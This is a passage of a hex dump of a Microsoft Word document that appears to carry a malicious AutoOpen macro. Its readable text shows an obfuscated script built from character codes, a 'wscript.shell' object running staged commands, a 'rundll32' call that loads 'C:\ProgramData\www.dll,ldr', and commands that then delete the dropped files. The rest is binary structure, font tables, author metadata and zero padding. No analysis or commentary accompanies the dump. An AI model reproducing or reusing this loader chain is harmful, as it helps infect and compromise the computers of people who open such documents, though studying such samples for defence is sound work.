0000ccb0: 0072 005d 0038 0039 002b 005b 0063 0068  .r.].8.9.+.[.c.h
0000ccc0: 0041 0072 005d 0035 0037 002b 005b 0063  .A.r.].5.7.+.[.c
0000ccd0: 0068 0041 0072 005d 0036 0035 0029 002c  .h.A.r.].6.5.).,
0000cce0: 005b 0073 0054 0072 0069 004e 0067 005d  .[.s.T.r.i.N.g.]
0000ccf0: 005b 0063 0068 0041 0072 005d 0039 0032  .[.c.h.A.r.].9.2
0000cd00: 0029 0029 002c 0020 0024 0072 0029 007d  .).).,. .$.r.).}
0000cd10: 0022 000d 000a 000d 000a 0053 0065 0074  .".........S.e.t
0000cd20: 0020 0052 0061 006e 0020 003d 0020 0043  . .R.a.n. .=. .C
0000cd30: 0072 0065 0061 0074 0065 004f 0062 006a  .r.e.a.t.e.O.b.j
0000cd40: 0065 0063 0074 0028 0022 0077 0073 0063  .e.c.t.(.".w.s.c
0000cd50: 0072 0069 0070 0074 002e 0073 0068 0065  .r.i.p.t...s.h.e
0000cd60: 006c 006c 0022 0029 000d 000a 0052 0061  .l.l.".).....R.a
0000cd70: 006e 002e 0052 0075 006e 0020 0048 0048  .n...R.u.n. .H.H
0000cd80: 0030 002b 004d 004d 0031 002c 0043 0068  .0.+.M.M.1.,.C.h
0000cd90: 0072 0028 0034 0038 0029 000d 000a 0057  .r.(.4.8.).....W
0000cda0: 0053 0063 0072 0069 0070 0074 002e 0053  .S.c.r.i.p.t...S
0000cdb0: 006c 0065 0065 0070 0028 0035 0030 0030  .l.e.e.p.(.5.0.0
0000cdc0: 0029 000d 000a 0052 0061 006e 002e 0052  .).....R.a.n...R
0000cdd0: 0075 006e 0020 0048 0048 0030 002b 004d  .u.n. .H.H.0.+.M
0000cde0: 004d 0032 002c 0043 0068 0072 0028 0034  .M.2.,.C.h.r.(.4
0000cdf0: 0038 0029 000d 000a 0057 0053 0063 0072  .8.).....W.S.c.r
0000ce00: 0069 0070 0074 002e 0053 006c 0065 0065  .i.p.t...S.l.e.e
0000ce10: 0070 0028 0035 0030 0030 0029 000d 000a  .p.(.5.0.0.)....
0000ce20: 0052 0061 006e 002e 0052 0075 006e 0020  .R.a.n...R.u.n. 
0000ce30: 0048 0048 0030 002b 004d 004d 0033 002c  .H.H.0.+.M.M.3.,
0000ce40: 0043 0068 0072 0028 0034 0038 0029 000d  .C.h.r.(.4.8.)..
0000ce50: 000a 0057 0053 0063 0072 0069 0070 0074  ...W.S.c.r.i.p.t
0000ce60: 002e 0053 006c 0065 0065 0070 0028 0035  ...S.l.e.e.p.(.5
0000ce70: 0030 0030 0029 000d 000a 0052 0061 006e  .0.0.).....R.a.n
0000ce80: 002e 0052 0075 006e 0020 0048 0048 0030  ...R.u.n. .H.H.0
0000ce90: 002b 004d 004d 0034 002c 0043 0068 0072  .+.M.M.4.,.C.h.r
0000cea0: 0028 0034 0038 0029 000d 000a 0057 0053  .(.4.8.).....W.S
0000ceb0: 0063 0072 0069 0070 0074 002e 0053 006c  .c.r.i.p.t...S.l
0000cec0: 0065 0065 0070 0028 0035 0030 0030 0029  .e.e.p.(.5.0.0.)
0000ced0: 000d 000a 0052 0061 006e 002e 0052 0075  .....R.a.n...R.u
0000cee0: 006e 0020 0048 0048 0030 002b 004d 004d  .n. .H.H.0.+.M.M
0000cef0: 0035 002c 0043 0068 0072 0028 0034 0038  .5.,.C.h.r.(.4.8
0000cf00: 0029 000d 000a 000d 000a 0057 0053 0063  .).........W.S.c
0000cf10: 0072 0069 0070 0074 002e 0053 006c 0065  .r.i.p.t...S.l.e
0000cf20: 0065 0070 0028 0031 0035 0030 0030 0030  .e.p.(.1.5.0.0.0
0000cf30: 0029 000d 000a 004f 004b 0031 0020 003d  .).....O.K.1. .=
0000cf40: 0020 0022 0063 006d 0064 0020 002f 0063  . .".c.m.d. ./.c
0000cf50: 0020 0072 0075 006e 0064 006c 006c 0033  . .r.u.n.d.l.l.3
0000cf60: 0032 002e 0065 0078 0065 0020 0043 003a  .2...e.x.e. .C.:
0000cf70: 005c 0050 0072 006f 0067 0072 0061 006d  .\.P.r.o.g.r.a.m
0000cf80: 0044 0061 0074 0061 005c 0077 0077 0077  .D.a.t.a.\.w.w.w
0000cf90: 002e 0064 006c 006c 002c 006c 0064 0072  ...d.l.l.,.l.d.r
0000cfa0: 0022 000d 000a 004f 004b 0032 0020 003d  .".....O.K.2. .=
0000cfb0: 0020 0022 0063 006d 0064 0020 002f 0063  . .".c.m.d. ./.c
0000cfc0: 0020 0064 0065 006c 0020 0043 003a 005c  . .d.e.l. .C.:.\
0000cfd0: 0070 0072 006f 0067 0072 0061 006d 0064  .p.r.o.g.r.a.m.d
0000cfe0: 0061 0074 0061 005c 0077 0077 0077 002a  .a.t.a.\.w.w.w.*
0000cff0: 0022 000d 000a 004f 004b 0033 0020 003d  .".....O.K.3. .=
0000d000: 0020 0022 0063 006d 0064 0020 002f 0063  . .".c.m.d. ./.c
0000d010: 0020 0064 0065 006c 0020 0043 003a 005c  . .d.e.l. .C.:.\
0000d020: 0070 0072 006f 0067 0072 0061 006d 0064  .p.r.o.g.r.a.m.d
0000d030: 0061 0074 0061 005c 0070 0069 006e 002a  .a.t.a.\.p.i.n.*
0000d040: 0022 000d 000a 0052 0061 006e 002e 0052  .".....R.a.n...R
0000d050: 0075 006e 0020 004f 004b 0031 002c 0020  .u.n. .O.K.1.,. 
0000d060: 0043 0068 0072 0028 0034 0038 0029 000d  .C.h.r.(.4.8.)..
0000d070: 000a 0057 0053 0063 0072 0069 0070 0074  ...W.S.c.r.i.p.t
0000d080: 002e 0053 006c 0065 0065 0070 0028 0031  ...S.l.e.e.p.(.1
0000d090: 0030 0030 0030 0029 000d 000a 0052 0075  .0.0.0.).....R.u
0000d0a0: 006e 002e 0052 0075 006e 0020 004f 004b  .n...R.u.n. .O.K
0000d0b0: 0032 002c 0020 0043 0068 0072 0028 0034  .2.,. .C.h.r.(.4
0000d0c0: 0038 0029 000d 000a 0052 0075 006e 002e  .8.).....R.u.n..
0000d0d0: 0052 0075 006e 0020 004f 004b 0033 002c  .R.u.n. .O.K.3.,
0000d0e0: 0020 0043 0068 0072 0028 0034 0038 0029  . .C.h.r.(.4.8.)
0000d0f0: 0000 0023 0022 f10c 0000 00bf 0100 0060  ...#.".........`
0000d100: 003f 0500 0001 0000 0010 f004 0000 0000  .?..............
0000d110: 0000 0000 0011 f004 0000 0001 0000 000f  ................
0000d120: 0004 f048 0000 0012 000a f008 0000 0001  ...H............
0000d130: 0400 0000 0e00 0063 000b f024 0000 0081  .......c...$....
0000d140: 0127 2727 00bf 0110 0010 00cb 0100 0000  .'''............
0000d150: 00ff 0100 0008 0004 0309 0000 003f 0301  .............?..
0000d160: 0001 0000 0011 f004 0000 0001 0000 0000  ................
0000d170: 0000 0001 0000 00d8 0100 0003 0400 006d  ...............m
0000d180: 1a00 007a fdff ff90 2400 00cb 0600 0074  ...z....$......t
0000d190: 4000 0000 0002 0400 0023 fbff ff5c fdff  @........#...\..
0000d1a0: ff46 0500 00ad 0600 0074 4000 0000 0000  .F.......t@.....
0000d1b0: 0000 000e 0100 0014 0100 0035 0100 003b  ...........5...;
0000d1c0: 0100 008b 0100 0091 0100 00da 0100 0007  ................
0000d1d0: 001c 0007 001c 0007 001c 0007 0000 0000  ................
0000d1e0: 00da 0100 0007 0000 0000 0004 0000 0005  ................
0000d1f0: 0000 00d3 0000 00d4 0000 0016 0100 003d  ...............=
0000d200: 0100 0061 0100 009c 0100 00ae 0100 00ba  ...a............
0000d210: 0100 00d7 0100 00da 0100 0003 0004 0003  ................
0000d220: 0004 0003 0004 0003 0004 0003 0004 0003  ................
0000d230: 0007 0000 0000 0004 0000 0005 0000 00d3  ................
0000d240: 0000 00d4 0000 0016 0100 003d 0100 0061  ...........=...a
0000d250: 0100 009c 0100 00ae 0100 00ba 0100 00d7  ................
0000d260: 0100 00da 0100 0003 0004 0003 0004 0003  ................
0000d270: 0004 0003 0004 0003 0004 0003 0007 006d  ...............m
0000d280: 0000 0004 0000 0008 0000 00e5 0000 0000  ................
0000d290: 0000 0068 0000 007b 2b00 0066 5900 0001  ...h...{+..fY...
0000d2a0: 350a 00a4 7c0f 00ca 6a19 00a5 7a19 004c  5...|...j...z..L
0000d2b0: 771b 00bb 301c 0084 0420 00f6 4120 0015  w...0.... ..A ..
0000d2c0: 7120 008d 2c23 0054 2825 00ae 2f27 008d  q ..,#.T(%../'..
0000d2d0: 1d28 0059 3a2b 0039 4e2c 0074 4930 00c2  .(.Y:+.9N,.tI0..
0000d2e0: 5930 00c3 2b31 0059 3931 004d 5032 0010  Y0..+1.Y91.MP2..
0000d2f0: 1533 00b6 5133 0093 4436 005d 2f38 0012  .3..Q3..D6.]/8..
0000d300: 073c 00ea 3b3d 008b 6340 0051 0343 0051  .<..;=..c@.Q.C.Q
0000d310: 4946 002f 7a47 00a7 5255 0016 1957 0010  IF./zG..RU...W..
0000d320: 5c5e 0013 2660 0047 2760 00c8 0961 007f  \^..&`.G'`...a..
0000d330: 2c62 00bb 6367 005f 746a 0093 596d 004e  ,b..cg._tj..Ym.N
0000d340: 3270 003d 1072 003a 4d73 000b 3176 0038  2p.=.r.:Ms..1v.8
0000d350: 4c76 00a2 6e77 0088 2a78 0038 0079 00bd  Lv..nw..*x.8.y..
0000d360: 1e79 00bc 347a 001f 678a 00d2 0f8b 004c  .y..4z..g......L
0000d370: 128b 002c 6e8f 001f 3391 0058 3592 008e  ...,n...3..X5...
0000d380: 1b94 0021 0096 002c 1897 00de 2a98 00dc  ...!...,....*...
0000d390: 4a99 00bf 749a 005e 069c 009c 0c9d 003b  J...t..^.......;
0000d3a0: 199e 00ed 27a0 0039 47a1 00d0 17a4 0022  ....'..9G......"
0000d3b0: 26a8 0040 20aa 00d1 20b2 00fc 6db2 0090  &..@ ... ...m...
0000d3c0: 47b4 00c6 7bb5 005b 4db9 0083 71b9 0047  G...{..[M...q..G
0000d3d0: 01bc 001d 16bd 00b4 00c0 0008 70c0 0078  ............p..x
0000d3e0: 76c0 0092 29c8 0002 2bc8 00ea 35ce 00ea  v...)...+...5...
0000d3f0: 73d0 00f4 66d1 000c 41d5 0066 3ad6 0024  s...f...A..f:..$
0000d400: 10d8 0059 13d9 004c 65da 002a 6ede 00bb  ...Y...Le..*n...
0000d410: 42df 001f 62e1 0080 07e3 001b 04e6 0013  B...b...........
0000d420: 21e7 007a 45e9 0008 0fed 00b9 55f2 00a1  !..zE.......U...
0000d430: 1ff3 00f0 00f4 00bc 49f6 001a 28f7 0060  ........I...(..`
0000d440: 54f7 0022 59f8 0077 38fa 0000 0000 00d8  T.."Y..w8.......
0000d450: 0100 00da 0100 0000 0000 0001 0000 00ff  ................
0000d460: 0101 0000 0056 0000 0000 00ff ff2e 1000  .....V..........
0000d470: 0000 0000 0015 0000 002e 1000 0010 ffff  ................
0000d480: 0100 0200 1400 5000 7200 6f00 6a00 6500  ......P.r.o.j.e.
0000d490: 6300 7400 2e00 6200 7800 6800 2e00 4100  c.t...b.x.h...A.
0000d4a0: 7500 7400 6f00 4f00 7000 6500 6e00 0100  u.t.o.O.p.e.n...
0000d4b0: 1101 0000 0014 0050 0052 004f 004a 0045  .......P.R.O.J.E
0000d4c0: 0043 0054 002e 0042 0058 0048 002e 0041  .C.T...B.X.H...A
0000d4d0: 0055 0054 004f 004f 0050 0045 004e 0000  .U.T.O.O.P.E.N..
0000d4e0: 0040 0101 0100 0100 0000 0200 0000 0000  .@..............
0000d4f0: 0000 0100 0100 0100 0000 0000 0000 0000  ................
0000d500: 0000 0000 0000 0210 0000 0000 0000 00d8  ................
0000d510: 0100 0010 0200 1000 4000 00ff ff01 0000  ........@.......
0000d520: 0007 0055 006e 006b 006e 006f 0077 006e  ...U.n.k.n.o.w.n
0000d530: 00ff ff01 0008 0000 0000 0000 0000 0000  ................
0000d540: 00ff ff01 0000 0000 00ff ff00 0002 00ff  ................
0000d550: ff00 0000 00ff ff00 0002 00ff ff00 0000  ................
0000d560: 0007 0000 0047 1e90 0100 0002 0206 0305  .....G..........
0000d570: 0405 0203 04ff 2e00 e05b 7800 c009 0000  .........[x.....
0000d580: 0000 0000 00ff 0100 0000 0000 0054 0069  .............T.i
0000d590: 006d 0065 0073 0020 004e 0065 0077 0020  .m.e.s. .N.e.w. 
0000d5a0: 0052 006f 006d 0061 006e 0000 0035 1e90  .R.o.m.a.n...5..
0000d5b0: 0102 0005 0501 0201 0706 0205 0700 0000  ................
0000d5c0: 0000 0000 1000 0000 0000 0000 0000 0000  ................
0000d5d0: 8000 0000 0053 0079 006d 0062 006f 006c  .....S.y.m.b.o.l
0000d5e0: 0000 0033 2e90 0100 0002 0b06 0402 0202  ...3............
0000d5f0: 0202 04ff 2e00 e05b 7800 c009 0000 0000  .......[x.......
0000d600: 0000 00ff 0100 0000 0000 0041 0072 0069  ...........A.r.i
0000d610: 0061 006c 0000 003f 2e90 0100 0600 0000  .a.l...?........
0000d620: 0000 0000 0000 00ff 2615 a10a 0000 8000  ........&.......
0000d630: 0001 0000 0000 009f 0100 0000 0000 0042  ...............B
0000d640: 0069 006f 006d 0065 0000 0042 0069 006f  .i.o.m.e...B.i.o
0000d650: 006d 0065 0000 0037 2e90 0100 0002 0f05  .m.e...7........
0000d660: 0202 0204 0302 04ff 2e00 e47b 2400 c009  ...........{$...
0000d670: 0000 0000 0000 00ff 0100 0000 0000 0043  ...............C
0000d680: 0061 006c 0069 0062 0072 0069 0000 0043  .a.l.i.b.r.i...C
0000d690: 2e2c 0100 0002 0f03 0202 0204 0302 04ff  .,..............
0000d6a0: 2e00 e47b 2400 c009 0000 0000 0000 00ff  ...{$...........
0000d6b0: 0100 0000 0000 0043 0061 006c 0069 0062  .......C.a.l.i.b
0000d6c0: 0072 0069 0020 004c 0069 0067 0068 0074  .r.i. .L.i.g.h.t
0000d6d0: 0000 0041 1e90 0100 0002 0405 0305 0406  ...A............
0000d6e0: 0302 04ff 0600 e0ff 2400 4200 0000 0200  ........$.B.....
0000d6f0: 0000 009f 0100 0000 0000 0043 0061 006d  ...........C.a.m
0000d700: 0062 0072 0069 0061 0020 004d 0061 0074  .b.r.i.a. .M.a.t
0000d710: 0068 0000 0022 0004 0071 0880 1800 f0c4  .h..."...q......
0000d720: 02e3 0468 0100 0000 00a7 4b9b 47c2 e9a6  ...h......K.G...
0000d730: 6700 0000 0010 008f 0700 0046 0000 0092  g..........F....
0000d740: 0100 0001 0001 0000 0004 0003 9003 0000  ................
0000d750: 0046 0000 0092 0100 0001 0001 0000 0003  .F..............
0000d760: 0000 0000 0000 00e1 0100 f010 0000 0001  ................
0000d770: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d780: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d790: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d7a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d7b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d7c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d7d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d7e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d7f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d800: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d810: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d820: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d830: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d840: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d850: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d860: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d870: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d880: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d890: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d8a0: 0000 0000 00a5 066e 04b4 00b4 0081 8172  .......n.......r
0000d8b0: 3000 0000 0000 0000 0000 0000 0000 00d7  0...............
0000d8c0: 0100 00d7 0100 0000 0000 00bb 1e0d 3500  ..............5.
0000d8d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d8e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d8f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d900: 0000 0002 0000 0000 0000 0000 0000 4b83  ..............K.
0000d910: 1100 f010 0008 00fc fd01 0000 0000 0000  ................
0000d920: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d930: 0000 0840 5000 0000 0009 f0ff 0f00 0924  ...@P..........$
0000d940: 5000 00e3 0400 00ff ffff 7fff ffff 7fff  P...............
0000d950: ffff 7fff ffff 7fff ffff 7fff ffff 7fff  ................
0000d960: ffff 7fa2 6e77 0000 0400 00b2 0000 0000  ....nw..........
0000d970: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000d980: 0021 0400 0000 0000 0000 0000 0000 0000  .!..............
0000d990: 0000 0000 0010 1c00 0006 0000 0000 0000  ................
0000d9a0: 0000 0078 0000 0078 0000 0000 0000 0000  ...x...x........
0000d9b0: 0000 00a0 0500 0033 bf36 010b 0000 0000  .......3.6......
0000d9c0: 0000 00dc 0000 0001 0000 00ff ff12 0000  ................
0000d9d0: 0000 0000 0000 0000 0000 0000 0001 0078  ...............x
0000d9e0: 000e 0044 0061 0076 0069 0064 0020 0046  ...D.a.v.i.d. .F
0000d9f0: 006f 0072 0073 0079 0074 0068 0065 0000  .o.r.s.y.t.h.e..
0000da00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000da10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000da20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000da30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000da40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000da50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000da60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000da70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000da80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000da90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000daa0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dab0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dac0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dad0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dae0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000daf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000db00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000db10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000db20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000db30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000db40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000db50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000db60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000db70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000db80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000db90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dba0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dbb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dbc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dbd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dbe0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dbf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dc00: feff 0000 0a00 0200 0000 0000 0000 0000  ................
0000dc10: 0000 0000 0000 0000 0100 0000 e085 9ff2  ................
0000dc20: f94f 6810 ab91 0800 2b27 b3d9 3000 0000  .Oh.....+'..0...
0000dc30: 7001 0000 1100 0000 0100 0000 9000 0000  p...............
0000dc40: 0200 0000 9800 0000 0300 0000 a400 0000  ................
0000dc50: 0400 0000 b000 0000 0500 0000 bc00 0000  ................
0000dc60: 0600 0000 c800 0000 0700 0000 d400 0000  ................
0000dc70: 0800 0000 e800 0000 0900 0000 0001 0000  ................
0000dc80: 1200 0000 0c01 0000 0a00 0000 2c01 0000  ............,...
0000dc90: 0c00 0000 3801 0000 0d00 0000 4401 0000  ....8.......D...
0000dca0: 0e00 0000 5001 0000 0f00 0000 5801 0000  ....P.......X...
0000dcb0: 1000 0000 6001 0000 1300 0000 6801 0000  ....`.......h...
0000dcc0: 0200 0000 e404 0000 1e00 0000 0400 0000  ................
0000dcd0: 0000 0000 1e00 0000 0400 0000 0000 0000  ................
0000dce0: 1e00 0000 0400 0000 7800 0000 1e00 0000  ........x.......
0000dcf0: 0400 0000 0000 0000 1e00 0000 0400 0000  ................
0000dd00: 0000 0000 1e00 0000 0c00 0000 4e6f 726d  ............Norm
0000dd10: 616c 2e64 6f74 6d00 1e00 0000 1000 0000  al.dotm.........
0000dd20: 4461 7669 6420 466f 7273 7974 6865 0000  David Forsythe..
0000dd30: 1e00 0000 0400 0000 3136 0000 1e00 0000  ........16......
0000dd40: 1800 0000 4d69 6372 6f73 6f66 7420 4f66  ....Microsoft Of
0000dd50: 6669 6365 2057 6f72 6400 0000 4000 0000  fice Word...@...
0000dd60: 001a fe50 0e01 0000 4000 0000 001a b896  ...P....@.......
0000dd70: bad5 d701 4000 0000 00bc 31cd c08b d801  ....@.....1.....
0000dd80: 0300 0000 0100 0000 0300 0000 4600 0000  ............F...
0000dd90: 0300 0000 9201 0000 0300 0000 0000 0000  ................
0000dda0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ddb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ddc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ddd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dde0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ddf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000de00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000de10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000de20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000de30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000de40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000de50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000de60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000de70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000de80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000de90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dea0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000deb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dec0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ded0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dee0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000def0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000df00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000df10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000df20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000df30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000df40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000df50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000df60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000df70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000df80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000df90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dfa0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dfb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dfc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dfd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dfe0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000dff0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e0a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e0b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e0c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e0d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e0e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e0f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e130: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e140: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e150: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e160: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e170: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e190: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e1a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e1b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e1c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e1d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e1e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e1f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e200: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e210: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e220: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e230: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e240: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e250: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e260: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e270: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e280: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e290: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e2a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e2b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e2c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e2d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e2e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e2f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e300: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e310: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e320: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e330: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e340: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e350: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e360: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e370: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e380: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e390: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e3a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e3b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e3c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e3d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e3e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e3f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e400: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e410: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e420: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e430: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e440: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e450: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e460: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e470: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e480: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e490: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e4a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e4b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e4c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e4d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e4e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e4f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e500: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e510: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e520: 0000 0000 0000 0000 0000 0000 0000 0000  ................
